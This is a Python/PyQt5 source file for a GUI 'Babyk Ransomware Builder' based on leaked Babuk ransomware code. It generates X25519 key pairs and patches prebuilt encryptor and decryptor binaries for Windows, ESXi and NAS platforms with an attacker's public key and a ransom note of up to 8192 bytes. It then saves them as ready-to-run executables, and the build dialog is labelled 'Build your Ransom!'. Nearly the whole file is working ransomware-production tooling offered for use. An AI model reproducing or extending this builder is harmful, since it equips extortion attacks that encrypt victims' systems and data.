# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'builder.ui'
#
# Created by: PyQt5 UI code generator 5.15.9
#
# WARNING: Any manual changes made to this file will be lost when pyuic5 is
# run again.  Do not edit this file unless you know what you are doing.

import sys,re,base64,json
from os import urandom
from templates import templates,pos_curve,pos_note
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import (QApplication, QMainWindow, QDialog, 
                             QMessageBox, QFileDialog)
from PyQt5.QtCore import Qt


class X25519:
    P = 2 ** 255 - 19
    A24 = 121665
    @classmethod
    def cswap(cls, swap, x_2, x_3):
        dummy = swap * ((x_2 - x_3) % cls.P)
        x_2 = x_2 - dummy
        x_2 %= cls.P
        x_3 = x_3 + dummy
        x_3 %= cls.P
        return (x_2, x_3)
    #Based on https://tools.ietf.org/html/rfc7748
    @classmethod
    def X25519(cls, k, u):
        x_1 = u
        x_2 = 1
        z_2 = 0
        x_3 = u
        z_3 = 1
        swap = 0
        for t in range(255, -1, -1):
            k_t = (k >> t) & 1
            swap ^= k_t
            x_2, x_3 = cls.cswap(swap, x_2, x_3)
            z_2, z_3 = cls.cswap(swap, z_2, z_3)
            swap = k_t
            A = (x_2 + z_2) % cls.P
            AA = pow(A, 2, cls.P)
            B = (x_2 - z_2) % cls.P
            BB = pow(B, 2, cls.P)
            E = (AA - BB) % cls.P
            C = (x_3 + z_3) % cls.P
            D = (x_3 - z_3) % cls.P
            DA = (D * A) % cls.P
            CB = (C * B) % cls.P
            x_3 = pow(DA + CB, 2, cls.P)
            z_3 = (x_1 * pow(DA - CB, 2, cls.P)) % cls.P
            x_2 = (AA * BB) % cls.P
            z_2 = (E * (AA + cls.A24 * E)) % cls.P
        x_2, x_3 = cls.cswap(swap, x_2, x_3)
        z_2, z_3 = cls.cswap(swap, z_2, z_3)
        ret = (x_2 * pow(z_2, cls.P - 2, cls.P)) % cls.P
        return ret
    @classmethod
    def decodeScalar25519(cls, k):
         k_list = bytearray(k)
         k_list[0] &= 248
         k_list[31] &= 127
         k_list[31] |= 64
         return cls.decodeLittleEndian(k_list)
    def decodeLittleEndian(b):
        return sum([b[i] << 8*i for i in range( 32 )])
    def unpack2(s):
        s = bytearray(s)
        if len(s) != 32:
            raise ValueError('Invalid Curve25519 scalar (len=%d)' % len(s))
        t = sum(s[i] << (8 * i) for i in range(31))
        t += ((s[31] & 0x7f) << 248)
        return t
    def pack(n):
        t = [(n >> (8 * i)) & 255 for i in range(32)]
        return bytes(t)
    def clamp(n):
        n &= ~7
        n &= ~(128 << 8 * 31)
        n |= 64 << 8 * 31
        return n
    #Return nP
    @classmethod
    def multscalar(cls, n, p):
        n = cls.clamp(cls.decodeScalar25519(n))
        p = cls.unpack2(p)
        return cls.pack(cls.X25519(n, p))
    #Start at x=9. Find point n times x-point
    @classmethod
    def base_point_mult(cls, n):
        n = cls.clamp(cls.decodeScalar25519(n))
        return cls.pack(cls.X25519(n, 9))

def check_hex(inp):
    if len(inp) != 64:
        return False
    if not re.match(r'^[0-9a-fA-F]{64}$', inp):
        return False
    return True

def check_pk(sk,pk):
    pks = X25519.base_point_mult(sk)
    return pks == pk

def is_x25519_private_key(content):
    return "-----BEGIN X25519 PRIVATE KEY-----" in content

def extract_pem_data(content, start_tag, end_tag):
    pattern = re.compile(f"{re.escape(start_tag)}(.*?){re.escape(end_tag)}", re.DOTALL)
    match = pattern.search(content)
    
    if not match:
        return None
    
    b64_data = match.group(1).strip().replace('\n', '')
    try:
        return base64.b64decode(b64_data)
    except ValueError:
        return None

def read_x25519_key(file_path):
    with open(file_path, 'r') as f:
        content = f.read()
            
    if is_x25519_private_key(content):
        key_data = extract_pem_data(
                content,
                "-----BEGIN X25519 PRIVATE KEY-----",
                "-----END X25519 PRIVATE KEY-----"
        )
        if key_data and len(key_data) == 32:
            return key_data
    return False
        

# Create a decryptor
def writeD(choice,key):
    data = bytearray(templates['d_'+choice])
    pos = pos_curve['d_'+choice]
    data[pos:pos+32] = key # PrivateKey
    return data

# Create a encryptor
def writeE(choice,key,note):
    # note length have to be lower than 8192
    data = bytearray(templates['e_'+choice])
    npos = pos_note['e_'+choice]
    kpos = pos_curve['e_'+choice]
    data[npos:npos+len(note)] = note
    data[kpos:kpos+32] = key # PublicKey
    return data

class Ui_BuildDialog(object):
    def setupUi(self, BuildDialog):
        BuildDialog.setObjectName("BuildDialog")
        BuildDialog.resize(249, 165)
        BuildDialog.setFixedSize(249, 165)
        self.label = QtWidgets.QLabel(BuildDialog)
        self.label.setGeometry(QtCore.QRect(20, 10, 211, 21))
        self.label.setStyleSheet("font: 87 14pt \"Arial Black\";")
        self.label.setObjectName("label")
        self.comboBox = QtWidgets.QComboBox(BuildDialog)
        self.comboBox.setGeometry(QtCore.QRect(100, 50, 91, 22))
        self.comboBox.setStyleSheet("font: 87 8pt \"Arial Black\";")
        self.comboBox.setObjectName("comboBox")
        self.comboBox.addItem("")
        self.comboBox.addItem("")
        self.comboBox.addItem("")
        self.comboBox.addItem("")
        self.label_2 = QtWidgets.QLabel(BuildDialog)
        self.label_2.setGeometry(QtCore.QRect(30, 45, 61, 31))
        self.label_2.setStyleSheet("font: 87 8pt \"Arial Black\";")
        self.label_2.setObjectName("label_2")
        self.label_3 = QtWidgets.QLabel(BuildDialog)
        self.label_3.setGeometry(QtCore.QRect(30, 75, 51, 31))
        self.label_3.setStyleSheet("font: 87 8pt \"Arial Black\";")
        self.label_3.setObjectName("label_3")
        self.checkBox = QtWidgets.QCheckBox(BuildDialog)
        self.checkBox.setGeometry(QtCore.QRect(40, 100, 81, 21))
        self.checkBox.setStyleSheet("font: 87 8pt \"Arial Black\";")
        self.checkBox.setObjectName("checkBox")
        self.checkBox_2 = QtWidgets.QCheckBox(BuildDialog)
        self.checkBox_2.setGeometry(QtCore.QRect(130, 100, 91, 21))
        self.checkBox_2.setStyleSheet("font: 87 8pt \"Arial Black\";")
        self.checkBox_2.setObjectName("checkBox_2")
        self.pushButton = QtWidgets.QPushButton(BuildDialog)
        self.pushButton.setGeometry(QtCore.QRect(90, 130, 75, 23))
        self.pushButton.setStyleSheet("font: 87 8pt \"Arial Black\";")
        self.pushButton.setObjectName("pushButton")

        self.retranslateUi(BuildDialog)
        QtCore.QMetaObject.connectSlotsByName(BuildDialog)

    def retranslateUi(self, BuildDialog):
        _translate = QtCore.QCoreApplication.translate
        BuildDialog.setWindowTitle(_translate("BuildDialog", "Build"))
        self.label.setText(_translate("BuildDialog", "Build your Ransom!"))
        self.comboBox.setItemText(0, _translate("BuildDialog", "win"))
        self.comboBox.setItemText(1, _translate("BuildDialog", "esxi"))
        self.comboBox.setItemText(2, _translate("BuildDialog", "nas_arm"))
        self.comboBox.setItemText(3, _translate("BuildDialog", "nas_x86"))
        self.label_2.setText(_translate("BuildDialog", "Platform:"))
        self.label_3.setText(_translate("BuildDialog", "Type:"))
        self.checkBox.setText(_translate("BuildDialog", "Encrpytor"))
        self.checkBox_2.setText(_translate("BuildDialog", "Decryptor"))
        self.pushButton.setText(_translate("BuildDialog", "Generate"))

class Ui_HelpDialog(object):
    def setupUi(self, HelpDialog):
        HelpDialog.setObjectName("HelpDialog")
        HelpDialog.setWindowModality(QtCore.Qt.ApplicationModal)
        HelpDialog.resize(284, 335)
        HelpDialog.setFixedSize(284, 335)
        HelpDialog.setContextMenuPolicy(QtCore.Qt.DefaultContextMenu)
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap(":/icon/Belu.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        HelpDialog.setWindowIcon(icon)
        HelpDialog.setWhatsThis("")
        HelpDialog.setSizeGripEnabled(False)
        HelpDialog.setModal(False)
        self.buttonBox = QtWidgets.QDialogButtonBox(HelpDialog)
        self.buttonBox.setGeometry(QtCore.QRect(-120, 300, 341, 32))
        self.buttonBox.setStyleSheet("font: 87 8pt \"Arial Black\";")
        self.buttonBox.setOrientation(QtCore.Qt.Horizontal)
        self.buttonBox.setStandardButtons(QtWidgets.QDialogButtonBox.Cancel|QtWidgets.QDialogButtonBox.Ok)
        self.buttonBox.setObjectName("buttonBox")
        self.label = QtWidgets.QLabel(HelpDialog)
        self.label.setGeometry(QtCore.QRect(20, 0, 251, 51))
        self.label.setStyleSheet("font: 87 12pt \"Arial Black\";")
        self.label.setObjectName("label")
        self.label_2 = QtWidgets.QLabel(HelpDialog)
        self.label_2.setGeometry(QtCore.QRect(90, 40, 101, 16))
        self.label_2.setObjectName("label_2")
        self.label_3 = QtWidgets.QLabel(HelpDialog)
        self.label_3.setGeometry(QtCore.QRect(30, 60, 231, 21))
        self.label_3.setStyleSheet("font: 87 8pt \"Arial Black\";")
        self.label_3.setObjectName("label_3")
        self.label_4 = QtWidgets.QLabel(HelpDialog)
        self.label_4.setGeometry(QtCore.QRect(23, 75, 231, 31))
        self.label_4.setStyleSheet("font: 87 8pt \"Arial Black\";")
        self.label_4.setOpenExternalLinks(True)
        self.label_4.setTextInteractionFlags(QtCore.Qt.TextBrowserInteraction)
        self.label_4.setObjectName("label_4")
        self.label_5 = QtWidgets.QLabel(HelpDialog)
        self.label_5.setGeometry(QtCore.QRect(23, 102, 181, 20))
        self.label_5.setStyleSheet("font: 87 8pt \"Arial Black\";")
        self.label_5.setObjectName("label_5")
        self.label_6 = QtWidgets.QLabel(HelpDialog)
        self.label_6.setGeometry(QtCore.QRect(0, 280, 281, 20))
        self.label_6.setStyleSheet("font: 87 8pt \"Arial Black\";\n"
"color: rgb(255, 0, 0);")
        self.label_6.setObjectName("label_6")
        self.label_7 = QtWidgets.QLabel(HelpDialog)
        self.label_7.setGeometry(QtCore.QRect(10, 130, 91, 16))
        self.label_7.setStyleSheet("font: 87 8pt \"Arial Black\";")
        self.label_7.setObjectName("label_7")
        self.label_8 = QtWidgets.QLabel(HelpDialog)
        self.label_8.setGeometry(QtCore.QRect(30, 150, 241, 16))
        self.label_8.setStyleSheet("font: 87 8pt \"Arial Black\";")
        self.label_8.setObjectName("label_8")
        self.label_9 = QtWidgets.QLabel(HelpDialog)
        self.label_9.setGeometry(QtCore.QRect(30, 160, 101, 21))
        self.label_9.setStyleSheet("font: 87 8pt \"Arial Black\";")
        self.label_9.setObjectName("label_9")
        self.label_10 = QtWidgets.QLabel(HelpDialog)
        self.label_10.setGeometry(QtCore.QRect(10, 180, 54, 21))
        self.label_10.setStyleSheet("font: 87 8pt \"Arial Black\";")
        self.label_10.setObjectName("label_10")
        self.label_11 = QtWidgets.QLabel(HelpDialog)
        self.label_11.setGeometry(QtCore.QRect(30, 195, 221, 21))
        self.label_11.setStyleSheet("font: 87 8pt \"Arial Black\";")
        self.label_11.setObjectName("label_11")
        self.label_12 = QtWidgets.QLabel(HelpDialog)
        self.label_12.setGeometry(QtCore.QRect(20, 210, 231, 20))
        self.label_12.setStyleSheet("font: 87 8pt \"Arial Black\";")
        self.label_12.setObjectName("label_12")
        self.label_13 = QtWidgets.QLabel(HelpDialog)
        self.label_13.setGeometry(QtCore.QRect(20, 219, 91, 31))
        self.label_13.setStyleSheet("font: 87 8pt \"Arial Black\";")
        self.label_13.setObjectName("label_13")
        self.label_14 = QtWidgets.QLabel(HelpDialog)
        self.label_14.setGeometry(QtCore.QRect(30, 240, 231, 21))
        self.label_14.setStyleSheet("font: 87 8pt \"Arial Black\";")
        self.label_14.setObjectName("label_14")
        self.label_15 = QtWidgets.QLabel(HelpDialog)
        self.label_15.setGeometry(QtCore.QRect(80, 260, 111, 16))
        self.label_15.setStyleSheet("font: 87 8pt \"Arial Black\";")
        self.label_15.setOpenExternalLinks(True)
        self.label_15.setTextInteractionFlags(QtCore.Qt.TextBrowserInteraction)
        self.label_15.setObjectName("label_15")

        self.retranslateUi(HelpDialog)
        self.buttonBox.accepted.connect(HelpDialog.accept) # type: ignore
        self.buttonBox.rejected.connect(HelpDialog.reject) # type: ignore
        QtCore.QMetaObject.connectSlotsByName(HelpDialog)

    def retranslateUi(self, HelpDialog):
        _translate = QtCore.QCoreApplication.translate
        HelpDialog.setWindowTitle(_translate("HelpDialog", "Help"))
        self.label.setText(_translate("HelpDialog", "Babyk Ransomware Builder"))
        self.label_2.setText(_translate("HelpDialog", "Created by pamnet"))
        self.label_3.setText(_translate("HelpDialog", "This is a ransomware builder built on"))
        self.label_4.setText(_translate("HelpDialog", "<p><a href=\"https://github.com/Hildaboo/BabukRansomwareSourceCode\">the leaked source code by VXUG </a> in Py</p>"))
        self.label_5.setText(_translate("HelpDialog", "thon and PyQt5(for GUI)."))
        self.label_6.setText(_translate("HelpDialog", "This project complies with the GPL3.0 license."))
        self.label_7.setText(_translate("HelpDialog", "Binary Files:"))
        self.label_8.setText(_translate("HelpDialog", "Hildaboo/BabukRansomwareSourceCode"))
        self.label_9.setText(_translate("HelpDialog", "Built by VS2022"))
        self.label_10.setText(_translate("HelpDialog", "GUI:"))
        self.label_11.setText(_translate("HelpDialog", "This program uses Qt version 5.15.2."))
        self.label_12.setText(_translate("HelpDialog", "Qt is a registered trademark of The Qt"))
        self.label_13.setText(_translate("HelpDialog", "Company Ltd."))
        self.label_14.setText(_translate("HelpDialog", "Qt © 1995-2025 The Qt Company Ltd."))
        self.label_15.setText(_translate("HelpDialog", "<p><a href=\"https://www.qt.io/\">https://www.qt.io/</a></p>"))

class BuildDialog(QDialog, Ui_BuildDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.parent = parent
        self.setupUi(self)
        self.setWindowFlags(
            Qt.Dialog |
            Qt.WindowTitleHint |
            Qt.WindowCloseButtonHint
        )
        self.setModal(True)
        self._bind_buttons()

    def _bind_buttons(self):
        self.pushButton.clicked.connect(self.generate)

    def generate(self):
        en = self.checkBox.isChecked() # Encryptor
        de = self.checkBox_2.isChecked() # Decryptor
        if not (en or de): # None selected
            QMessageBox.critical(
                self,
                "Error",
                "None selected.",
                QMessageBox.Ok
            )
            return None
        platform = self.comboBox.currentText()
        sk = self.parent.skedit.text()
        if not check_hex(sk):
            QMessageBox.critical(
                self,
                "Error",
                "Private Key is incorrect!",
                QMessageBox.Ok
            )
            return None
        pk = self.parent.pubedit.text()
        if not check_pk(bytes.fromhex(sk),bytes.fromhex(pk)):
            QMessageBox.critical(
                self,
                "Error",
                "The public and private keys may not match.",
                QMessageBox.Ok
            )
            return None
        note = self.parent.noteedit.toPlainText()
        if not note:
            QMessageBox.information(
                self,
                "Info",
                "The note may be empty.",
                QMessageBox.Ok
            )
        elif len(note) > 8192:
            QMessageBox.critical(
                self,
                "Error",
                "Note may be greater than 8192 bytes.",
                QMessageBox.Ok
            )
            return None
        if en:
            endata = writeE(platform,bytes.fromhex(pk),note.encode())
            file_path, _ = QFileDialog.getSaveFileName(
                self,
                f"Save a encryptor for {platform}",
                f"encryptor_{platform}",
                "Out File (*.out);;All files (*)" if platform != 'win' else "Executable File (*.exe);;All files (*)")
            if file_path:
                try:
                    with open(file_path,'wb') as f:
                        f.write(endata)
                    QMessageBox.information(
                        self,
                        "Info",
                        f"Encryptor succeeds to save as {file_path}.",
                        QMessageBox.Ok
                        )
                except Exception as e:
                    QMessageBox.critical(
                    self,
                    "Error",
                    f"Failed to save the decryptor:{str(e)}",
                    QMessageBox.Ok
                )
        if de:
            dedata = writeD(platform,bytes.fromhex(sk))
            file_path, _ = QFileDialog.getSaveFileName(
                self,
                f"Save a decryptor for {platform}",
                f"decryptor_{platform}",
                "Out File (*.out);;All files (*)" if platform != 'win' else "Executable File (*.exe);;All files (*)")
            if file_path:
                try:
                    with open(file_path,'wb') as f:
                        f.write(dedata)
                    QMessageBox.information(
                        self,
                        "Info",
                        f"Decryptor succeeds to save as {file_path}.",
                        QMessageBox.Ok
                        )
                except Exception as e:
                    QMessageBox.critical(
                    self,
                    "Error",
                    f"Failed to save the decryptor:{str(e)}",
                    QMessageBox.Ok
                )

class HelpDialog(QDialog, Ui_HelpDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setupUi(self)
        self.setWindowFlags(
            Qt.Dialog |
            Qt.WindowTitleHint |
            Qt.WindowCloseButtonHint
        )
        self.setModal(False)

class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(400, 550)
        MainWindow.setFixedSize(400, 550)
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap(":/icon/Belu.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        MainWindow.setWindowIcon(icon)
        MainWindow.setStyleSheet("")
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.marisachan = QtWidgets.QLabel(self.centralwidget)
        self.marisachan.setGeometry(QtCore.QRect(-10, 310, 230, 230))
        self.marisachan.setStyleSheet("border-image: url(:/homepage/Kirisame_Marisa_2.png);")
        self.marisachan.setText("")
        self.marisachan.setObjectName("marisachan")
        self.configroup = QtWidgets.QGroupBox(self.centralwidget)
        self.configroup.setGeometry(QtCore.QRect(10, 10, 381, 311))
        self.configroup.setStyleSheet("font: 87 9pt \"Arial Black\";")
        self.configroup.setObjectName("configroup")
        self.pklabel = QtWidgets.QLabel(self.configroup)
        self.pklabel.setGeometry(QtCore.QRect(20, 30, 91, 16))
        self.pklabel.setStyleSheet("font: 87 9pt \"Arial Black\";")
        self.pklabel.setObjectName("pklabel")
        self.pubedit = QtWidgets.QLineEdit(self.configroup)
        self.pubedit.setGeometry(QtCore.QRect(40, 50, 331, 20))
        self.pubedit.setObjectName("pubedit")
        self.sklabel = QtWidgets.QLabel(self.configroup)
        self.sklabel.setGeometry(QtCore.QRect(20, 80, 81, 16))
        self.sklabel.setObjectName("sklabel")
        self.skedit = QtWidgets.QLineEdit(self.configroup)
        self.skedit.setGeometry(QtCore.QRect(40, 100, 331, 20))
        self.skedit.setObjectName("skedit")
        self.Gennew = QtWidgets.QPushButton(self.configroup)
        self.Gennew.setGeometry(QtCore.QRect(30, 130, 101, 31))
        self.Gennew.setStyleSheet("")
        self.Gennew.setObjectName("Gennew")
        self.fromsk = QtWidgets.QPushButton(self.configroup)
        self.fromsk.setGeometry(QtCore.QRect(140, 130, 121, 31))
        self.fromsk.setObjectName("fromsk")
        self.notelabel = QtWidgets.QLabel(self.configroup)
        self.notelabel.setGeometry(QtCore.QRect(20, 170, 54, 12))
        self.notelabel.setObjectName("notelabel")
        self.noteedit = QtWidgets.QTextEdit(self.configroup)
        self.noteedit.setGeometry(QtCore.QRect(40, 190, 261, 71))
        self.noteedit.setObjectName("noteedit")
        self.fromkeyfile = QtWidgets.QPushButton(self.configroup)
        self.fromkeyfile.setGeometry(QtCore.QRect(270, 130, 81, 31))
        self.fromkeyfile.setObjectName("fromkeyfile")
        self.notefromfile = QtWidgets.QPushButton(self.configroup)
        self.notefromfile.setGeometry(QtCore.QRect(300, 190, 81, 71))
        self.notefromfile.setStyleSheet("")
        self.notefromfile.setObjectName("notefromfile")
        self.saveconfig = QtWidgets.QPushButton(self.configroup)
        self.saveconfig.setGeometry(QtCore.QRect(90, 270, 91, 31))
        self.saveconfig.setObjectName("saveconfig")
        self.loadconfig = QtWidgets.QPushButton(self.configroup)
        self.loadconfig.setGeometry(QtCore.QRect(210, 270, 91, 31))
        self.loadconfig.setObjectName("loadconfig")
        self.label = QtWidgets.QLabel(self.configroup)
        self.label.setGeometry(QtCore.QRect(10, 255, 81, 31))
        self.label.setStyleSheet("font: 87 7pt \"Arial Black\";")
        self.label.setObjectName("label")
        self.buildbutton = QtWidgets.QPushButton(self.centralwidget)
        self.buildbutton.setGeometry(QtCore.QRect(240, 360, 131, 41))
        self.buildbutton.setStyleSheet("font: 87 14pt \"Arial Black\";")
        self.buildbutton.setObjectName("buildbutton")
        self.helpbutton = QtWidgets.QPushButton(self.centralwidget)
        self.helpbutton.setGeometry(QtCore.QRect(240, 420, 131, 41))
        self.helpbutton.setStyleSheet("font: 87 14pt \"Arial Black\";")
        self.helpbutton.setObjectName("helpbutton")
        self.quitbutton = QtWidgets.QPushButton(self.centralwidget)
        self.quitbutton.setGeometry(QtCore.QRect(240, 480, 131, 41))
        self.quitbutton.setStyleSheet("font: 87 14pt \"Arial Black\";")
        self.quitbutton.setObjectName("quitbutton")
        MainWindow.setCentralWidget(self.centralwidget)

        self.retranslateUi(MainWindow)
        self.quitbutton.clicked.connect(MainWindow.close) # type: ignore
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "BabykBuilder"))
        self.configroup.setTitle(_translate("MainWindow", "Config"))
        self.pklabel.setText(_translate("MainWindow", "Public Key:"))
        self.sklabel.setText(_translate("MainWindow", "Private Key:"))
        self.Gennew.setText(_translate("MainWindow", "Generate New"))
        self.fromsk.setText(_translate("MainWindow", "From Private Key"))
        self.notelabel.setText(_translate("MainWindow", "Note:"))
        self.fromkeyfile.setText(_translate("MainWindow", "From Files"))
        self.notefromfile.setText(_translate("MainWindow", "From Files"))
        self.saveconfig.setText(_translate("MainWindow", "Save Config"))
        self.loadconfig.setText(_translate("MainWindow", "Load Config"))
        self.label.setText(_translate("MainWindow", "0/8192"))
        self.buildbutton.setText(_translate("MainWindow", "Build!"))
        self.helpbutton.setText(_translate("MainWindow", "Help?"))
        self.quitbutton.setText(_translate("MainWindow", "Quit"))

    def open_build_dialog(self):
        self.build_dialog = BuildDialog(parent=self)
        self.build_dialog.show()

    def open_help_dialog(self):
        self.help_dialog = HelpDialog(parent=self)
        self.help_dialog.show()

class MainWindow(QMainWindow, Ui_MainWindow):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self._bind_buttons()

    def _bind_buttons(self):
        self.buildbutton.clicked.connect(self.open_build_dialog)
        self.helpbutton.clicked.connect(self.open_help_dialog)
        self.noteedit.textChanged.connect(self.update_char_count)
        self.Gennew.clicked.connect(self.generate_keys)
        self.fromsk.clicked.connect(self.from_sk)
        self.notefromfile.clicked.connect(self.from_note_file)
        self.fromkeyfile.clicked.connect(self.from_sk_file)
        self.saveconfig.clicked.connect(self.save_configs)
        self.loadconfig.clicked.connect(self.load_configs)

    def open_build_dialog(self):
        self.build_dialog = BuildDialog(parent=self)
        self.build_dialog.exec_()

    def open_help_dialog(self):
        self.help_dialog = HelpDialog(parent=self)
        self.help_dialog.show()

    def update_char_count(self):
        self.note = self.noteedit.toPlainText()
        count = len(self.note) # \n too
        self.label.setText(f"{count}/8192")
        if count > 8192:
            self.label.setStyleSheet(
                "font: 87 7pt \"Arial Black\"; color: rgb(255, 0, 0);"
            )
        else:
            self.label.setStyleSheet(
                "font: 87 7pt \"Arial Black\";"
            )

    def generate_keys(self):
        private = urandom(32)
        public = X25519.base_point_mult(private)
        self.skedit.setText(private.hex().upper())
        self.pubedit.setText(public.hex().upper())

    def from_sk(self):
        private_hex = self.skedit.text()
        if not check_hex(private_hex):
            QMessageBox.critical(
                self,
                "Error",
                "Private Key is incorrect!",
                QMessageBox.Ok
            )
        else:
            public = X25519.base_point_mult(bytes.fromhex(private_hex))
            self.pubedit.setText(public.hex().upper())

    def from_note_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self,
            "Select a file",
            "",
            "All Files (*)")
        if file_path:
            try:
                with open(file_path,'r') as f:
                    note = f.read()
                    if len(note) > 8192:
                        QMessageBox.information(
                        self,
                        "Info",
                        "Note file may be greater than 8192 bytes.",
                        QMessageBox.Ok
                        )
                    self.noteedit.setText(note)
            except UnicodeDecodeError:
                QMessageBox.critical(
                    self,
                    "Error",
                    "Note file may contain binary.",
                    QMessageBox.Ok
                )
            except Exception as e:
                QMessageBox.critical(
                    self,
                    "Error",
                    f"Failed to open the note file:{str(e)}",
                    QMessageBox.Ok
                )

    def from_sk_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self,
            "Select a file",
            "",
            "All Files (*)")
        if file_path:
            try:
                sk = read_x25519_key(file_path)
                if not sk:
                    QMessageBox.critical(
                        self,
                        "Error",
                        f"The private key format is not supported",
                        QMessageBox.Ok
                    )
                    return None
                self.skedit.setText(sk.hex().upper())
                self.pubedit.setText(X25519.base_point_mult(sk).hex().upper())
            except Exception as e:
                QMessageBox.critical(
                    self,
                    "Error",
                    f"Failed to open the sk file:{str(e)}",
                    QMessageBox.Ok
                )

    def save_configs(self):
        private_hex = self.skedit.text()
        public_hex = self.pubedit.text()
        note = self.noteedit.toPlainText()
        data = {'private':private_hex,
                'public':public_hex,
                'note':note}
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Save a file",
            "",
            "JSON File (*.json);;All files (*)")
        if file_path:
            try:
                json.dump(data,open(file_path,'w'))
                QMessageBox.information(
                        self,
                        "Info",
                        f"Succeed to save as {file_path}.",
                        QMessageBox.Ok
                        )
            except Exception as e:
                QMessageBox.critical(
                    self,
                    "Error",
                    f"Failed to save the config file:{str(e)}",
                    QMessageBox.Ok
                )

    def load_configs(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self,
            "Select a file",
            "",
            "JSON File (*.json);;All files (*)")
        if file_path:
            try:
                data = json.load(open(file_path,'r'))
                sk = data['private']
                pk = data['public']
                note = data['note']
                self.skedit.setText(sk)
                if not check_pk(bytes.fromhex(sk),bytes.fromhex(pk)):
                    QMessageBox.warning(
                        self,
                        "Warning",
                        "The public and private keys may not match.",
                        QMessageBox.Ok)
                self.pubedit.setText(pk)
                self.noteedit.setText(note)
            except Exception as e:
                QMessageBox.critical(
                    self,
                    "Error",
                    f"Failed to open the config file:{str(e)}",
                    QMessageBox.Ok
                )

import resources_rc

if __name__ == "__main__":
    app = QApplication(sys.argv)
    main_window = MainWindow()
    main_window.show()
    sys.exit(app.exec_())
